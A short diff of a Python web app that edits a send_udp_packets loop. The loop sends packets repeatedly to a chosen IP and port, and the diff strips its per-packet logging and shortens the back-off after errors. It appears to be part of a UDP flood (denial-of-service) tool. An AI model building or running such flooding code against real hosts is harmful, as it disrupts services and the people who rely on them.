@@ -15,10 +15,9 @@ def send_udp_packets(ip, port):
         try:
             sock.sendto(bytes_data, (ip, port))
             sent += 1
-            print(f"Sent {sent} packets to {ip} at port {port}.")
         except Exception as e:
-            print(f"Error encountered: {e}")
-            time.sleep(0.1)
+            time.sleep(0.01)
+            print("Active...")
 
 @app.route('/')
 def index():
